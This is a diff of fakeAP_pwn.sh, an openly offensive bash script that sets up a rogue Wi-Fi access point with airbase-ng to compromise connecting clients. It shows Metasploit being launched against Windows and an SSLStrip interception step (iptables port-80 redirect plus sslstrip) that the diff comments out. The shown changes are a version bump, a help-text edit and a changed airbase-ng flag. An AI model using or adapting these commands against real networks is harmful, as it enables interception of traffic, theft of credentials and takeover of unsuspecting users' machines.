@@ -1,6 +1,6 @@
 #!/bin/bash                                                                                    #
 # (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
-# fakeAP_pwn.sh (v0.3-RC12 2010-07-07)                                                         #
+# fakeAP_pwn.sh (v0.3-RC13 2010-07-07)                                                         #
 #----------------------------------------------------------------------------------------------#
 # Make sure to copy "www": cp -rf www/* $htdocs_folder/                                        #
 # The VNC password is "g0tmi1k" (without "")                                                   #
@@ -38,7 +38,7 @@ export          verbose=0                            # 0/1/2      - Verbose mode
 export gatewayIP=`route -n | awk '/^0.0.0.0/ {getline; print $2}'`
 export     ourIP=`ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}'`
 export      port=`shuf -i 2000-65000 -n 1`
-export   version="0.3-RC12"
+export   version="0.3-RC13"
 trap 'cleanup' 2 # Interrupt - "Ctrl + C"
 #-----------------------------------------------------------------------------------------------
 function cleanup() {
@@ -92,7 +92,7 @@ function help() {
    -v  ---  Verbose mode (Displays exactly whats going on.)
    -V  ---  Higher level of Verbose
    -u  ---  Update FakeAP_pwn [*]
-   -?  ---  This screen
+   -?  ---  This help screen
 "
    exit 1
 }
@@ -482,7 +482,7 @@ $xterm -geometry 75x15+10+0 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e 
 echo -e "\e[01;32m[>]\e[00m Creating our fake access point..."
 if [ "$respond2All" == "true" ]; then
    if [ "$verbose" == "2" ] ; then echo "[i] Command: airbase-ng -P -C 0 -c $fakeAPchannel -e \"$ESSID\" $monitorInterface -v"; fi
-   $xterm -geometry 75x4+10+0 -T "fakeAP_pwn v$version - Fake Access Point" -e "airbase-ng -P -C 0 -c $fakeAPchannel -e \"$ESSID\" $monitorInterface -v" &
+   $xterm -geometry 75x4+10+0 -T "fakeAP_pwn v$version - Fake Access Point" -e "airbase-ng -P -C 30 -c $fakeAPchannel -e \"$ESSID\" $monitorInterface -v" &
 else
    if [ "$verbose" == "2" ] ; then echo "[i] Command: airbase-ng -c $fakeAPchannel -e \"$ESSID\" $monitorInterface -v"; fi
    $xterm -geometry 75x4+10+0 -T "fakeAP_pwn v$version - Fake Access Point" -e "airbase-ng -c $fakeAPchannel -e \"$ESSID\" $monitorInterface -v" &
@@ -542,11 +542,11 @@ if [ "$transparent" != "true" ]; then
    sleep 7
 fi
 
-echo -e "\e[01;32m[>]\e[00m Starting SSLStrip..."
-if [ "$verbose" == "2" ] ; then echo "[i] Command: iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000"; fi
-iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
-if [ "$verbose" == "2" ] ; then echo "[i] Command: sslstrip -k -f -l 10000"; fi
-$xterm -geometry 0x0+0+0 -T "fakeAP_pwn v$version - SSLStrip" -e "sslstrip -k -f -l 10000" &
+#echo -e "\e[01;32m[>]\e[00m Starting SSLStrip..."
+#if [ "$verbose" == "2" ] ; then echo "[i] Command: iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000"; #fi
+#iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+#if [ "$verbose" == "2" ] ; then echo "[i] Command: sslstrip -k -f -l 10000"; fi
+#$xterm -geometry 0x0+0+0 -T "fakeAP_pwn v$version - SSLStrip" -e "sslstrip -k -f -l 10000" &
 
 echo -e "\e[01;32m[>]\e[00m Starting DHCP server..."
 if [ "$verbose" == "2" ] ;
